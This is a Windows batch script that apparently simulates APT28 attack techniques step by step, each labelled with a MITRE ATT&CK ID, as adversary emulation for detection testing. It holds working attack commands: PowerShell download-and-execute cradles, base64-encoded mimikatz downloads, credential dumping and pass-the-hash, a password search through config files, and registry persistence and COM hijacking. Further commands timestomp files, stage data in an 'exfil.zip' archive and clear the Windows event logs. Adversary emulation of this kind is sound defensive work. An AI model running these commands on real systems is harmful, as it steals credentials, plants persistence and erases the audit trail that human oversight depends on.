@ECHO OFF
CLS
color 0E


ECHO -----------------------------------------
ECHO [-] Technique: Process Discovery (T1057)
ECHO [+] Process Discovery 
ECHO -----------------------------------------
cmd /c tasklist /v >> %temp%\APT28\pi.log
ECHO.



ECHO.
ECHO -----------------------------------------------------
ECHO [-] Technique: Remote File Copy (T1105)
ECHO [+] Simulates Remote File Copy via mapped drive "SMB"
ECHO -----------------------------------------------------
net use Z: \\live.sysinternals.com
COPY /Y "Z:\procdump.exe" %temp%\APT28\
ping 127.0.0.1 -n 4 > nul
cmd /c net use Z: /delete /Y
ECHO.



ECHO.
ECHO ---------------------------------------------------------------------
ECHO [-] Technique: File and Directory Discovery (T1083)
ECHO [+] Simulates discovery of specific file extensions using "forfiles"
ECHO ---------------------------------------------------------------------
for %%G in (.doc, .docx, .pdf) do (
  for /f "delims=" %%A in ('forfiles -p %USERPROFILE% /s /m *%%G /c "cmd /c echo @path"') do (
    ECHO %%A >> %temp%\APT28\T1083.txt 
  )
)
ECHO.



ECHO.
ECHO -----------------------------------------------
ECHO [-] Technique: Automated Collection	(T1119)
ECHO [+] Collection via Powershell
ECHO -----------------------------------------------
powershell -noni -nop -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/greycel/APT-Simulation/master/APT28/T1119/AutoCollect.ps1')
ECHO.



ECHO.
ECHO ------------------------------------------------------------------
ECHO [-] Technique: Data from Local System	(T1005)
ECHO [+] Simulates Collection of Data from Local System using "forfiles"
ECHO ------------------------------------------------------------------
cmd /c forfiles /P "C:\Program Files" /S /M *.conf /C "cmd /c findstr /m password @path" >> %temp%\APT28\T1005.txt
ECHO.




ECHO.
ECHO ---------------------------------------------------------------------
ECHO [-] Technique: Rundll32 (T1085) 
ECHO [+] Simulates use of "Rundll32" to load and execute suspicious DLL's
ECHO ---------------------------------------------------------------------
COPY /Y %utilities%\AllTheThingsx64.dll %PUBLIC%\
rundll32.exe %PUBLIC%\AllTheThingsx64.dll,EntryPoint
ECHO.




ECHO.
ECHO ---------------------------------------------------------------------------
ECHO [-] Technique: Scripting (T1064) 
ECHO [+] Simulates execution of remote Powershell script to download "mimikatz"
ECHO ---------------------------------------------------------------------------
reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
if %OS%==32BIT powershell -nop -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABmAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAcgBlAHkAYwBlAGwALwBBAFAAVAAtAFMAaQBtAHUAbABhAHQAaQBvAG4ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AVQB0AGkAbABpAHQAaQBlAHMALwBtAGkAbQBpAGsAYQB0AHoAWAA4ADYALgBlAHgAZQAiACwAIgBDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABtAGkAbQBlAC4AZQB4AGUAIgApAA==
::Decode-Powershell
::[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatzX86.exe","$env:temp\APT28\mime.exe")
if %OS%==64BIT powershell -nop -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABmAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGcAcgBlAHkAYwBlAGwALwBBAFAAVAAtAFMAaQBtAHUAbABhAHQAaQBvAG4ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AVQB0AGkAbABpAHQAaQBlAHMALwBtAGkAbQBpAGsAYQB0AHoAWAA2ADQALgBlAHgAZQAiACwAIgBDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABtAGkAbQBlAC4AZQB4AGUAIgApAA==
ECHO.
ECHO.
::Decode-Powershell
::[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).Downloadfile("https://github.com/greycel/APT-Simulation/blob/master/Utilities/mimikatzX64.exe","$env:temp\APT28\mime.exe")




ECHO.
ECHO -------------------------------------------------
ECHO [-] Technique: Credential Dumping (T1003)
ECHO [+] Simulates Credential Dumping using "mimikatz"
ECHO --------------------------------------------------
ping 127.0.0.1 -n 4 > nul
%temp%\APT28\mime.exe "privilege::debug" "sekurlsa::logonpasswords" exit >> %temp%\APT28\T1075.txt
ECHO.




ECHO.
ECHO -------------------------------------------------
ECHO [-] Technique: Pass the Hash (T1075)
ECHO [+] Simulates Path-the-Hash (PTH) using "mimikatz"
ECHO --------------------------------------------------
ping 127.0.0.1 -n 4 > nul
%temp%\APT28\mime.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:aria.com /ntlm:cc36gf7a8514793efccd3326464tkg1a" exit
ECHO.



ECHO.
ECHO ----------------------------------------------------
ECHO [-] Technique: Data Staged	(T1074)
ECHO [+] Collecting System Account and Group Information
ECHO ----------------------------------------------------
ECHO.
net Accounts >> "%temp%\APT28\pi.log"
net localgroup administrators >> "%temp%\APT28\pi.log"
net config workstation >> "%temp%\APT28\pi.log"
net accounts >> "%temp%\APT28\pi.log"
ECHO.



ECHO.
ECHO ------------------------------------------------------------------
ECHO [-] Technique: Logon Scripts	(T1037)
ECHO [+] Simulates modification of Registry Key to acehive persistence
ECHO ------------------------------------------------------------------
reg add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "cmd.exe /c calc.exe" /f
ping 127.0.0.1 -n 4 > nul
reg delete HKCU\Environment /v UserInitMprLogonScript /f
ECHO.



ECHO.
ECHO --------------------------------------------------------
ECHO [-] Technique: COM Hijacking (T1122)
ECHO [+] Simulate COM Hijack Technique to execute "calc.exe"
ECHO --------------------------------------------------------
reg import %utilities%\Slmgr.reg
ping 127.0.0.1 -n 2 > nul
slmgr.vbs
REG DELETE HKCU\Software\Classes\Scripting.Dictionary\CLSID /f
REG DELETE HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f
ECHO.




ECHO.
ECHO -------------------------------------------------------------------
ECHO [-] Technique: Timestomp	(T1099)
ECHO [+] Simulate Timestomping by modifing timestamps of dropped files
ECHO -------------------------------------------------------------------
ECHO.
%utilities%\timestomper.exe -p2 %systemroot%\system.ini -p %temp%\APT28\ -r
ECHO.



ECHO.
ECHO ---------------------------------------
ECHO [-] Technique: File Deletion (T1107)
ECHO [+] Deleting files to cover the tracks
ECHO ---------------------------------------
xcopy /S /Y %utilities%\MessageBox32.dll %appdata%\
ping 127.0.0.1 -n 4 > nul
del /f "%temp%\APT28\procdump.exe"
del /f "%temp%\APT28\mime.exe"
del /f "%appdata%\MessageBox32.dll"
del /f "%PUBLIC%\AllTheThingsx64.dll"
ECHO.




ECHO.
ECHO ----------------------------------------------------
ECHO [-] Technique: Data compression techniques	(T1002)
ECHO [+] Compress Data using Command Prompt and Powershell
ECHO -----------------------------------------------------
powershell.exe -noprofile -command "DIR %temp%\APT28\* -Recurse | Compress-Archive -force -DestinationPath %temp%\APT28\exfil.zip"
ECHO.



ECHO.
ECHO ------------------------------------------------------
ECHO [-] Technique: Hidden Files and Directories	(T1158)
ECHO [+] Simulates Hidding of files using 'attrib' utility
ECHO ------------------------------------------------------
ping 127.0.0.1 -n 4 > nul
attrib +h "%temp%\APT28\exfil.zip"
ECHO.



ECHO.
ECHO ------------------------------------------------
ECHO [-] Technique: Indicator Removal on Host (T1070)
ECHO [+] Clear Windows Event Logs to hide the tracks
ECHO ------------------------------------------------
wevtutil cl System
wevtutil cl Security
cmd /k tasklist
ECHO.




